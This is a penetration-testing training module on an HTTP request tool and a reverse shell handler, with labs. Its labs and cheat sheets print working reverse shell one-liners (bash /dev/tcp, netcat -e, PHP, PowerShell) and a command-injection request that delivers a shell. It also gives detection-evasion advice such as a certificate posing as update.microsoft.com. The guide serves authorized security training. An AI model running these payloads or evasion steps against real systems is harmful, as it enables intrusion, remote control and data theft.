# HTTP and C2 Operations Training Guide

**Module:** HTTP Request Tool and Reverse Shell Handler Operations
**Version:** 1.0
**Classification:** Authorized Security Testing Only
**Prerequisites:** Basic networking, TCP/IP fundamentals, Linux command line proficiency
**Duration:** 4-6 hours (including lab exercises)

---

## Table of Contents

1. [Module Overview](#module-overview)
2. [HTTP Operations in Penetration Testing](#http-operations-in-penetration-testing)
3. [HTTP Request Tool Deep Dive](#http-request-tool-deep-dive)
4. [Reverse Shell Handler Deep Dive](#reverse-shell-handler-deep-dive)
5. [C2 Operations Concepts](#c2-operations-concepts)
6. [Hands-On Labs](#hands-on-labs)
7. [Tool Integration](#tool-integration)
8. [Quick Reference](#quick-reference)

---

## Module Overview

### Learning Objectives

Upon completion of this module, you will be able to:

- Craft custom HTTP requests for web application security testing
- Configure and operate reverse shell listeners for authorized assessments
- Understand command and control (C2) communication fundamentals
- Integrate multiple tools into cohesive operational workflows
- Apply operational security principles to C2 operations

### Target Audience

This training is designed for penetration testers, red team operators, and security assessors who need to:

- Conduct manual web application testing
- Establish controlled communication channels during engagements
- Understand offensive tooling from an operator perspective

---

## HTTP Operations in Penetration Testing

### The Importance of Manual HTTP Testing

In modern penetration testing, HTTP remains the predominant protocol for both legitimate application traffic and security assessment activities. While automated scanners and vulnerability assessment tools provide broad coverage, manual HTTP testing delivers precision and context that automated tools simply cannot match.

Manual HTTP testing allows operators to understand application behavior at a granular level. When you craft requests by hand, you observe exactly how the application responds to specific inputs, timing variations, and header manipulations. This level of control is essential for identifying subtle vulnerabilities that automated scanners miss, such as business logic flaws, authorization bypasses, and complex injection vectors that require multi-step exploitation chains.

The web application attack surface continues to expand. Modern applications rely heavily on APIs, microservices architectures, and complex authentication mechanisms. Each of these components introduces potential security weaknesses that require careful manual analysis. A well-crafted HTTP request can reveal information disclosure through verbose error messages, identify authentication weaknesses through header manipulation, or expose injection points through careful parameter fuzzing.

### Automated vs Manual Requests

Automated scanning tools excel at breadth. They can rapidly test thousands of endpoints for known vulnerability signatures, check for common misconfigurations, and map application structure. However, automation operates on predefined rules and cannot adapt to application-specific behaviors or novel vulnerability patterns.

Manual testing provides depth. When an automated scanner reports a potential SQL injection, manual verification confirms exploitability and determines impact. When testing authentication mechanisms, manual requests allow precise control over session tokens, timing, and request sequences that reveal race conditions or session management flaws.

The most effective approach combines both methodologies:

```
+------------------+     +------------------+     +------------------+
|   Automated      |     |   Manual         |     |   Exploitation   |
|   Discovery      | --> |   Verification   | --> |   Development    |
+------------------+     +------------------+     +------------------+
        |                        |                        |
   - Endpoint mapping      - Confirm vulns         - Craft payloads
   - Parameter discovery   - Assess impact         - Chain attacks
   - Known CVE checks      - Context analysis      - Document proof
```

### Web Application Assessment Workflow

A structured approach to web application testing maximizes coverage and efficiency:

**Phase 1: Reconnaissance**
- Map application endpoints and parameters
- Identify technologies through response headers and behavior
- Document authentication mechanisms and session handling

**Phase 2: Targeted Testing**
- Craft requests to test specific functionality
- Manipulate headers, cookies, and body content
- Analyze responses for information leakage

**Phase 3: Exploitation**
- Develop working proof-of-concept requests
- Chain vulnerabilities for maximum impact demonstration
- Document attack paths and remediation guidance

**Phase 4: Reporting**
- Capture raw request/response pairs as evidence
- Demonstrate reproducibility through documented commands
- Provide actionable technical recommendations

Understanding the underlying HTTP mechanics enables operators to work effectively regardless of the specific tooling available. Whether using dedicated security tools, programming libraries, or command-line utilities, the fundamental concepts remain constant.

---

## HTTP Request Tool Deep Dive

The HTTP Request Tool provides a flexible interface for crafting and sending custom HTTP requests during security assessments. Unlike general-purpose HTTP clients, this tool is optimized for penetration testing workflows with features specifically designed for security analysis.

### Architecture Overview

```
+------------------+     +------------------+     +------------------+
|  CLI Interface   | --> |   HTTPClient     | --> |   Target Server  |
+------------------+     +------------------+     +------------------+
        |                        |
        v                        v
+------------------+     +------------------+
|  RequestConfig   |     |  HTTPResponse    |
|  - method        |     |  - status_code   |
|  - headers       |     |  - headers       |
|  - body          |     |  - body          |
|  - ssl options   |     |  - ssl_info      |
|  - redirects     |     |  - timing        |
+------------------+     +------------------+
```

### Supported HTTP Methods

The tool supports all standard HTTP methods, enabling comprehensive API and web application testing:

| Method  | Purpose                              | Common Use Cases                    |
|---------|--------------------------------------|-------------------------------------|
| GET     | Retrieve resources                   | Information gathering, parameter testing |
| POST    | Submit data for processing           | Form submission, API calls          |
| PUT     | Create or replace resources          | REST API testing, file upload       |
| DELETE  | Remove resources                     | Privilege testing, IDOR attacks     |
| PATCH   | Partial resource modification        | API field manipulation              |
| HEAD    | Retrieve headers only                | Metadata enumeration                |
| OPTIONS | Query supported methods              | CORS analysis, method enumeration   |

**Basic Method Usage:**

```bash
# GET request (default)
python3 tool.py http://target.com/api/users

# POST request with method flag
python3 tool.py http://target.com/api/login -X POST -d '{"user":"admin"}'

# PUT request for resource creation
python3 tool.py http://target.com/api/users/1 -X PUT -d '{"role":"admin"}'

# DELETE request for IDOR testing
python3 tool.py http://target.com/api/users/999 -X DELETE
```

### Custom Headers and Cookies

Header manipulation is essential for authentication testing, WAF bypass, and application behavior analysis.

**Adding Custom Headers:**

```bash
# Single custom header
python3 tool.py http://target.com/admin -H "Authorization: Bearer eyJhbGc..."

# Multiple headers
python3 tool.py http://target.com/api \
    -H "Authorization: Bearer token123" \
    -H "X-Forwarded-For: 127.0.0.1" \
    -H "X-Custom-Header: test_value"

# Cookie manipulation
python3 tool.py http://target.com/dashboard \
    -H "Cookie: session=abc123; admin=true"

# Content-Type for JSON APIs
python3 tool.py http://target.com/api/data -X POST \
    -H "Content-Type: application/json" \
    -d '{"key":"value"}'
```

**Header Injection Testing:**

```bash
# CRLF injection attempt
python3 tool.py "http://target.com/redirect?url=http://evil.com%0d%0aSet-Cookie:admin=1"

# Host header manipulation
python3 tool.py http://target.com/ -H "Host: internal.target.com"
```

### Request Body Handling

The tool supports multiple methods for providing request body content:

**Inline Data:**

```bash
# URL-encoded form data (default Content-Type)
python3 tool.py http://target.com/login -X POST \
    -d "username=admin&password=test123"

# JSON payload
python3 tool.py http://target.com/api/users -X POST \
    -H "Content-Type: application/json" \
    -d '{"username":"admin","email":"admin@target.com"}'

# XML payload
python3 tool.py http://target.com/api/xml -X POST \
    -H "Content-Type: application/xml" \
    -d '<?xml version="1.0"?><user><name>test</name></user>'
```

**Data from File:**

```bash
# Load payload from file
python3 tool.py http://target.com/api/upload -X POST \
    -f /path/to/payload.json

# Useful for large payloads or binary data
python3 tool.py http://target.com/api/import -X POST \
    -H "Content-Type: application/octet-stream" \
    -f /path/to/binary_data
```

### SSL/TLS Inspection

For HTTPS targets, the tool provides certificate inspection and verification control:

```bash
# Default: SSL verification disabled for self-signed certs
python3 tool.py https://target.com/api

# View SSL certificate details (included in verbose output)
python3 tool.py https://target.com/ -v

# The response includes SSL info:
# SSL CERTIFICATE:
#   Subject: {'commonName': 'target.com'}
#   Issuer: {'organizationName': 'DigiCert Inc', ...}
#   Expires: Dec 31 23:59:59 2025 GMT
```

**SSL-related security testing:**

```bash
# Test for protocol downgrade
python3 tool.py https://target.com/ -k  # Skip verification

# Observe certificate chain information in response
# Useful for identifying self-signed certs, expired certs, or mismatched hosts
```

### Redirect Handling

Control how the tool handles HTTP redirects:

```bash
# Don't follow redirects (default) - see redirect response
python3 tool.py http://target.com/old-page

# Follow redirects with -L flag
python3 tool.py http://target.com/old-page -L

# Limit redirect depth (default: 5)
python3 tool.py http://target.com/redirect-chain -L --max-redirects 3
```

**Redirect testing scenarios:**

```bash
# Open redirect detection
python3 tool.py "http://target.com/redirect?url=http://evil.com"

# Redirect chain analysis
python3 tool.py http://target.com/oauth/callback?code=test -L -v
# Output shows: Redirects: http://... -> https://... -> final
```

### Authentication Options

**Bearer Token Authentication:**

```bash
python3 tool.py http://target.com/api/protected \
    -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIs..."
```

**Basic Authentication:**

```bash
# Manual Base64 encoding
python3 tool.py http://target.com/admin \
    -H "Authorization: Basic YWRtaW46cGFzc3dvcmQ="
```

**API Key Authentication:**

```bash
# Header-based API key
python3 tool.py http://target.com/api/data \
    -H "X-API-Key: secret_key_value"

# Query parameter API key
python3 tool.py "http://target.com/api/data?api_key=secret_key_value"
```

### Planning Mode

Before sending requests, use planning mode to verify configuration:

```bash
python3 tool.py http://target.com/api/users -X POST \
    -H "Authorization: Bearer token" \
    -d '{"test":"data"}' \
    --plan

# Output:
# [PLAN MODE] Tool: http-request-tool
# ================================================================================
# REQUEST DETAILS
# ----------------------------------------
#   Method:          POST
#   URL:             http://target.com/api/users
#   Host:            target.com
#   Path:            /api/users
# ...
# No actions will be taken. Remove --plan flag to execute.
```

---

## Reverse Shell Handler Deep Dive

The Reverse Shell Handler provides a multi-protocol listener for receiving and managing incoming shell connections during authorized penetration testing engagements.

### Architecture Overview

```
+------------------+     +------------------+     +------------------+
|  Target System   | --> |  Shell Handler   | --> |   Operator       |
|  (Payload Exec)  |     |  (Listener)      |     |  (Interactive)   |
+------------------+     +------------------+     +------------------+
                                 |
                     +-----------+-----------+
                     |                       |
              +------v------+        +-------v-------+
              |   Session   |        |   Session     |
              |   Manager   |        |   Storage     |
              +-------------+        +---------------+
```

### TCP Listener Configuration

**Basic Listener Setup:**

```bash
# Default: Listen on all interfaces, port 4444
python3 tool.py

# Specify port
python3 tool.py -l 8080

# Specify interface and port
python3 tool.py -H 192.168.1.100 -l 443

# Set session timeout (seconds)
python3 tool.py -l 4444 -t 600
```

**Configuration Parameters:**

| Parameter    | Default   | Description                           |
|--------------|-----------|---------------------------------------|
| `-H/--host`  | 0.0.0.0   | Listen address (bind interface)       |
| `-l/--port`  | 4444      | Listen port                           |
| `-t/--timeout` | 300     | Session timeout in seconds            |
| `-m/--multi` | false     | Enable multi-session mode             |
| `-v/--verbose` | false   | Enable verbose output                 |

### SSL/TLS Encrypted Shells

Encrypted communications help evade network detection and protect operational data:

```bash
# Enable SSL with auto-generated certificate
python3 tool.py -l 443 --ssl

# Use custom certificates
python3 tool.py -l 443 --ssl \
    --ssl-cert /path/to/cert.pem \
    --ssl-key /path/to/key.pem
```

**Generating SSL Certificates:**

```bash
# Self-signed certificate for testing
openssl req -x509 -newkey rsa:4096 \
    -keyout key.pem -out cert.pem \
    -days 365 -nodes \
    -subj "/CN=update.microsoft.com"
```

### Multi-Session Management

For engagements requiring multiple simultaneous connections:

```bash
# Start handler in multi-session mode
python3 tool.py -l 4444 -m

# Handler output:
# [*] Handler listening on 0.0.0.0:4444
# [*] Waiting for connection...
# [+] Connection from 192.168.1.50:54321
# [+] Session ID: 1
# [*] Use 'sessions' to list, 'interact <id>' to connect
```

**Session Management Workflow:**

```
+-------------------+
|  Multi-Handler    |
|  Mode Active      |
+-------------------+
         |
         v
+-------------------+
|  New Connection   |---> Session ID Assigned
+-------------------+
         |
         v
+-------------------+
|  sessions         |---> List all active sessions
+-------------------+
         |
         v
+-------------------+
|  interact <id>    |---> Enter interactive session
+-------------------+
         |
         v
+-------------------+
|  background       |---> Return to handler (session persists)
+-------------------+
```

### Platform-Specific Payloads

The tool includes a payload generator for various target platforms:

```bash
# Generate all payloads for your listener
python3 tool.py --payloads -H 10.0.0.5 -l 4444
```

**Available Payload Types:**

| Platform    | Payload Type    | Notes                              |
|-------------|-----------------|-------------------------------------|
| Linux/Unix  | bash            | Direct bash reverse shell           |
| Linux/Unix  | bash_b64        | Base64 encoded (evade basic filters)|
| Linux/Unix  | python          | Python one-liner                    |
| Linux/Unix  | netcat          | Netcat with -e flag                 |
| Linux/Unix  | netcat_no_e     | Netcat without -e (FIFO method)     |
| Linux/Unix  | php             | PHP reverse shell                   |
| Linux/Unix  | perl            | Perl one-liner                      |
| Linux/Unix  | ruby            | Ruby one-liner                      |
| Windows     | powershell      | PowerShell reverse shell            |

**Example Payload Output:**

```
[BASH]
------------------------------------------------------------
bash -i >& /dev/tcp/10.0.0.5/4444 0>&1

[PYTHON]
------------------------------------------------------------
python3 -c 'import socket,subprocess,os;s=socket.socket(...)'

[POWERSHELL]
------------------------------------------------------------
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient..."
```

### Session Interaction

**Interactive Session Commands:**

```
+------------------+--------------------------------------------+
| Command          | Action                                     |
+------------------+--------------------------------------------+
| (any command)    | Sent to remote shell                       |
| background       | Return to handler, keep session alive      |
| exit             | Close current session                      |
| Ctrl+C           | Interrupt current session                  |
+------------------+--------------------------------------------+
```

**Interaction Flow:**

```bash
# Handler receives connection
[*] Interacting with session 1 (192.168.1.50:54321)
[*] Type 'background' to return to handler, 'exit' to close session

# Commands are sent to remote shell
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

whoami
www-data

# Background the session
background
[*] Session backgrounded

# Return to handler prompt for additional connections
```

---

## C2 Operations Concepts

### Command and Control Fundamentals

Command and Control (C2) infrastructure provides the communication backbone for penetration testing operations. During authorized assessments, C2 enables:

- Remote access to compromised systems
- Data exfiltration and collection
- Lateral movement coordination
- Persistent access maintenance

**C2 Architecture Components:**

```
+-------------------+       +-------------------+       +-------------------+
|   Operator        | <---> |   C2 Server       | <---> |   Implant/Agent   |
|   Workstation     |       |   (Handler)       |       |   (Target)        |
+-------------------+       +-------------------+       +-------------------+
                                    |
                    +---------------+---------------+
                    |               |               |
              +-----v----+   +------v-----+  +------v------+
              | Session 1|   | Session 2  |  | Session N   |
              +----------+   +------------+  +-------------+
```

### Communication Patterns

**Reverse Connections (Pull-based):**

The target initiates connections outbound to the operator's listener. This approach:
- Bypasses inbound firewall rules
- Blends with normal outbound traffic
- Requires operator to maintain listener

```
Target System                    Operator System
      |                                |
      |  1. Outbound Connection        |
      |------------------------------->|
      |                                |
      |  2. Bidirectional Comms        |
      |<==============================>|
```

**Bind Shells (Push-based):**

The target opens a listening port that the operator connects to. This approach:
- May trigger firewall alerts
- Requires inbound access to target
- Useful when outbound filtering is strict

### Operational Security

**OPSEC Principles for C2 Operations:**

1. **Minimize Footprint**
   - Use encrypted channels when possible
   - Limit connection duration
   - Clean up artifacts after operations

2. **Blend with Normal Traffic**
   - Use common ports (80, 443, 8080)
   - Employ legitimate-looking User-Agents
   - Consider traffic timing patterns

3. **Session Hygiene**
   - Maintain session inventory
   - Close unused connections promptly
   - Document all access for reporting

4. **Infrastructure Separation**
   - Isolate C2 systems from production
   - Use dedicated assessment networks
   - Implement access controls on handlers

**Detection Vectors to Consider:**

```
+------------------------+--------------------------------+
| Detection Method       | Mitigation Approach            |
+------------------------+--------------------------------+
| Network monitoring     | SSL/TLS encryption             |
| Process enumeration    | Use common process names       |
| Firewall logging       | Standard ports, low frequency  |
| SIEM correlation       | Vary timing, use proxies       |
| Endpoint detection     | Memory-only operations         |
+------------------------+--------------------------------+
```

---

## Hands-On Labs

### Lab 1: Manual Web Testing with HTTP Tool

**Objective:** Use the HTTP Request Tool to manually enumerate and test a web application's API endpoints.

**Scenario:** You have identified a web application at `http://target-app.lab` with an API endpoint structure. Your task is to enumerate available endpoints and identify potential vulnerabilities.

**Environment Requirements:**
- HTTP Request Tool installed
- Target web application running (lab environment)
- Network connectivity to target

**Tasks:**

1. **Basic Enumeration**

   Perform an initial GET request to identify the application:
   ```bash
   python3 tool.py http://target-app.lab/ --plan
   # Review the plan, then execute
   python3 tool.py http://target-app.lab/
   ```

   Document the response headers and identify server technology.

2. **API Discovery**

   Test common API paths:
   ```bash
   python3 tool.py http://target-app.lab/api/
   python3 tool.py http://target-app.lab/api/v1/
   python3 tool.py http://target-app.lab/api/users
   ```

   Note status codes and responses for each endpoint.

3. **Method Testing**

   Test different HTTP methods on discovered endpoints:
   ```bash
   python3 tool.py http://target-app.lab/api/users -X OPTIONS
   python3 tool.py http://target-app.lab/api/users -X POST -d '{}'
   python3 tool.py http://target-app.lab/api/users/1 -X DELETE
   ```

4. **Header Manipulation**

   Test for header-based vulnerabilities:
   ```bash
   # Host header injection
   python3 tool.py http://target-app.lab/ -H "Host: evil.com"

   # X-Forwarded-For bypass
   python3 tool.py http://target-app.lab/admin -H "X-Forwarded-For: 127.0.0.1"
   ```

**Validation Criteria:**
- [ ] Identified server technology from headers
- [ ] Documented available API endpoints
- [ ] Tested at least 3 different HTTP methods
- [ ] Attempted header manipulation attacks

**Hints:**
- Pay attention to error messages - they often reveal information
- Try adding `Content-Type: application/json` for API endpoints
- Look for verbose error handling in responses

---

### Lab 2: API Exploitation Workflow

**Objective:** Chain multiple HTTP requests to identify and exploit an API vulnerability.

**Scenario:** The target API at `http://api.lab:8080` has a user management system. You have obtained a low-privilege API token. Your goal is to escalate privileges through API manipulation.

**Environment Requirements:**
- HTTP Request Tool installed
- Target API running
- Valid low-privilege API token provided

**Tasks:**

1. **Authenticated Enumeration**

   Use your token to enumerate available endpoints:
   ```bash
   export TOKEN="eyJhbGciOiJIUzI1NiIs..."

   python3 tool.py http://api.lab:8080/api/me \
       -H "Authorization: Bearer $TOKEN"

   python3 tool.py http://api.lab:8080/api/users \
       -H "Authorization: Bearer $TOKEN"
   ```

2. **Identify IDOR Vulnerability**

   Test for Insecure Direct Object Reference:
   ```bash
   # Your user ID is 100, test access to other users
   python3 tool.py http://api.lab:8080/api/users/1 \
       -H "Authorization: Bearer $TOKEN"

   python3 tool.py http://api.lab:8080/api/users/2 \
       -H "Authorization: Bearer $TOKEN"
   ```

3. **Privilege Escalation Attempt**

   Test for mass assignment or parameter pollution:
   ```bash
   # Attempt to modify your own role
   python3 tool.py http://api.lab:8080/api/users/100 -X PUT \
       -H "Authorization: Bearer $TOKEN" \
       -H "Content-Type: application/json" \
       -d '{"role":"admin"}'

   # Attempt to add admin to your account
   python3 tool.py http://api.lab:8080/api/users/100 -X PATCH \
       -H "Authorization: Bearer $TOKEN" \
       -H "Content-Type: application/json" \
       -d '{"is_admin":true}'
   ```

4. **Verify Exploitation**

   Confirm privilege escalation:
   ```bash
   python3 tool.py http://api.lab:8080/api/admin/users \
       -H "Authorization: Bearer $TOKEN"
   ```

**Validation Criteria:**
- [ ] Successfully authenticated to API
- [ ] Identified IDOR vulnerability
- [ ] Escalated privileges through API manipulation
- [ ] Documented complete attack chain

**Extension Challenge:**
- Identify additional vulnerable endpoints
- Extract sensitive data through IDOR
- Document recommended fixes

---

### Lab 3: Setting Up Reverse Shell Listeners

**Objective:** Configure and operate reverse shell listeners with various options.

**Scenario:** During a penetration test, you need to establish reverse shell infrastructure to receive callbacks from compromised systems.

**Environment Requirements:**
- Reverse Shell Handler installed
- Isolated lab network
- Test target system for callback testing

**Tasks:**

1. **Basic Listener Setup**

   Start with planning mode to understand configuration:
   ```bash
   python3 tool.py --plan
   python3 tool.py -l 4444 --plan
   ```

   Start a basic listener:
   ```bash
   python3 tool.py -l 4444
   ```

2. **Generate Payloads**

   Generate payloads for your listener:
   ```bash
   # Replace with your actual IP
   python3 tool.py --payloads -H 10.0.0.5 -l 4444
   ```

   Document the different payload types and their use cases.

3. **SSL-Encrypted Listener**

   Set up an encrypted listener:
   ```bash
   # Generate certificates first
   openssl req -x509 -newkey rsa:2048 \
       -keyout /tmp/key.pem -out /tmp/cert.pem \
       -days 30 -nodes -subj "/CN=test"

   # Start SSL listener
   python3 tool.py -l 443 --ssl \
       --ssl-cert /tmp/cert.pem \
       --ssl-key /tmp/key.pem
   ```

4. **Test Connection**

   From a test target, establish connection:
   ```bash
   # On target (example using netcat)
   nc YOUR_IP 4444 -e /bin/bash

   # Or using bash directly
   bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
   ```

**Validation Criteria:**
- [ ] Successfully started listener on specified port
- [ ] Generated payloads for multiple platforms
- [ ] Configured SSL-encrypted listener
- [ ] Received test connection

**Hints:**
- Use verbose mode (-v) for troubleshooting
- Check firewall rules if connections fail
- Ensure listener IP is reachable from target

---

### Lab 4: Multi-Session Management

**Objective:** Manage multiple simultaneous shell sessions during an engagement simulation.

**Scenario:** You are conducting an assessment where multiple systems will callback to your handler. You need to manage these sessions efficiently.

**Environment Requirements:**
- Reverse Shell Handler with multi-session support
- Multiple test targets (or simulated connections)
- Isolated lab network

**Tasks:**

1. **Start Multi-Handler**

   Configure for multiple sessions:
   ```bash
   python3 tool.py -l 4444 -m -v
   ```

   Note the different behavior from single-session mode.

2. **Establish Multiple Sessions**

   From separate test targets (or terminals), establish connections:
   ```bash
   # Target 1
   bash -i >& /dev/tcp/HANDLER_IP/4444 0>&1

   # Target 2
   python3 -c 'import socket,subprocess,os;...'

   # Target 3
   nc HANDLER_IP 4444 -e /bin/sh
   ```

3. **Session Management**

   Practice session operations:
   ```
   # In handler, after connections established
   # List sessions - shows all connected targets

   # Interact with specific session
   interact 1

   # Run commands
   whoami
   hostname

   # Background session
   background

   # Switch to another session
   interact 2
   ```

4. **Session Documentation**

   For each session, document:
   - Session ID
   - Source IP and port
   - Target hostname/identity
   - Commands executed
   - Data collected

**Validation Criteria:**
- [ ] Successfully managed 3+ simultaneous sessions
- [ ] Demonstrated session switching
- [ ] Backgrounded and resumed sessions
- [ ] Documented all session activity

**Extension Challenge:**
- Script automated data collection across all sessions
- Implement session persistence checks
- Develop session cleanup procedures

---

## Tool Integration

### Combining with Payload Generator

The reverse shell handler's payload generator integrates with broader exploitation workflows:

```
+-------------------+     +-------------------+     +-------------------+
|   Vulnerability   | --> |   Payload         | --> |   Reverse Shell   |
|   Exploitation    |     |   Generator       |     |   Handler         |
+-------------------+     +-------------------+     +-------------------+
        |                         |                         |
   - SQL Injection           - Platform detect         - Receive shell
   - Command Injection       - Generate payload        - Manage session
   - File Upload             - Encode/obfuscate        - Execute commands
```

**Workflow Example:**

```bash
# Step 1: Start handler
python3 reverse-shell-handler/tool.py -l 4444 &

# Step 2: Generate payload
python3 reverse-shell-handler/tool.py --payloads -H 10.0.0.5 -l 4444 | grep -A1 BASH

# Step 3: Use HTTP tool to deliver payload via command injection
python3 http-request-tool/tool.py \
    "http://target.com/vulnerable.php" \
    -X POST \
    -d "cmd=bash+-i+>%26+/dev/tcp/10.0.0.5/4444+0>%261"

# Step 4: Interact with received shell
```

### Automation Workflows

**Scripted Reconnaissance:**

```bash
#!/bin/bash
# Automated endpoint enumeration

TARGET="http://target.com"
ENDPOINTS=("api" "admin" "login" "users" "config")
METHODS=("GET" "POST" "OPTIONS")

for endpoint in "${ENDPOINTS[@]}"; do
    for method in "${METHODS[@]}"; do
        echo "[*] Testing $method $TARGET/$endpoint"
        python3 tool.py "$TARGET/$endpoint" -X "$method" --no-body 2>/dev/null
    done
done
```

**Sequential Testing Chain:**

```bash
#!/bin/bash
# Test authentication bypass techniques

TARGET="http://target.com/admin"

echo "[*] Testing authentication bypasses..."

# Direct access
python3 tool.py "$TARGET"

# With admin header
python3 tool.py "$TARGET" -H "X-Admin: true"

# With localhost forwarding
python3 tool.py "$TARGET" -H "X-Forwarded-For: 127.0.0.1"

# With host override
python3 tool.py "$TARGET" -H "Host: localhost"
```

---

## Quick Reference

### HTTP Request Tool Cheat Sheet

```
+------------------------------------------------------------------+
|  HTTP Request Tool - Quick Reference                              |
+------------------------------------------------------------------+
| BASIC USAGE                                                       |
|   python3 tool.py <URL>                     # GET request         |
|   python3 tool.py <URL> -X POST             # POST request        |
|   python3 tool.py <URL> --plan              # Preview request     |
+------------------------------------------------------------------+
| HEADERS & DATA                                                    |
|   -H "Name: Value"                          # Add header          |
|   -d "data"                                 # Request body        |
|   -f file.txt                               # Body from file      |
+------------------------------------------------------------------+
| SSL & REDIRECTS                                                   |
|   -k                                        # Skip SSL verify     |
|   -L                                        # Follow redirects    |
|   --max-redirects N                         # Redirect limit      |
+------------------------------------------------------------------+
| OUTPUT                                                            |
|   --no-headers                              # Hide headers        |
|   --no-body                                 # Hide body           |
|   -r                                        # Raw output          |
|   -o file.txt                               # Save to file        |
+------------------------------------------------------------------+
```

### Reverse Shell Handler Cheat Sheet

```
+------------------------------------------------------------------+
|  Reverse Shell Handler - Quick Reference                          |
+------------------------------------------------------------------+
| LISTENER SETUP                                                    |
|   python3 tool.py                           # Default (4444)      |
|   python3 tool.py -l PORT                   # Custom port         |
|   python3 tool.py -H IP -l PORT             # Bind to interface   |
|   python3 tool.py -l PORT --ssl             # SSL listener        |
|   python3 tool.py -l PORT -m                # Multi-session       |
+------------------------------------------------------------------+
| PAYLOADS                                                          |
|   --payloads -H IP -l PORT                  # Show all payloads   |
+------------------------------------------------------------------+
| SESSION COMMANDS                                                  |
|   background                                # Background session  |
|   exit                                      # Close session       |
|   interact <id>                             # Switch session      |
+------------------------------------------------------------------+
| COMMON PORTS                                                      |
|   4444 - Default (may be flagged)                                |
|   443  - HTTPS (blends with traffic)                             |
|   80   - HTTP (blends with traffic)                              |
|   8080 - Alt HTTP (common proxy port)                            |
+------------------------------------------------------------------+
```

### Quick Payload Reference

```
+------------------------------------------------------------------+
|  Platform-Specific Reverse Shell Payloads                         |
+------------------------------------------------------------------+
| LINUX/UNIX                                                        |
|   Bash:    bash -i >& /dev/tcp/IP/PORT 0>&1                      |
|   Python:  python3 -c 'import socket...'                         |
|   Netcat:  nc -e /bin/sh IP PORT                                 |
|   PHP:     php -r '$sock=fsockopen("IP",PORT)...'                |
+------------------------------------------------------------------+
| WINDOWS                                                           |
|   PowerShell: powershell -nop -c "$client = New-Object..."       |
+------------------------------------------------------------------+
```

---

## Assessment Checklist

Before concluding operations, verify:

- [ ] All sessions properly closed
- [ ] Handler processes terminated
- [ ] Temporary files cleaned up
- [ ] Activity documented for reporting
- [ ] No persistent access left on targets (unless authorized)

---

**Document Version:** 1.0
**Last Updated:** 2025-01-10
**Next Review:** Quarterly or upon tool updates

**REMINDER:** These tools and techniques are for authorized security assessments only. Unauthorized use against systems you do not own or have explicit permission to test is illegal and unethical.
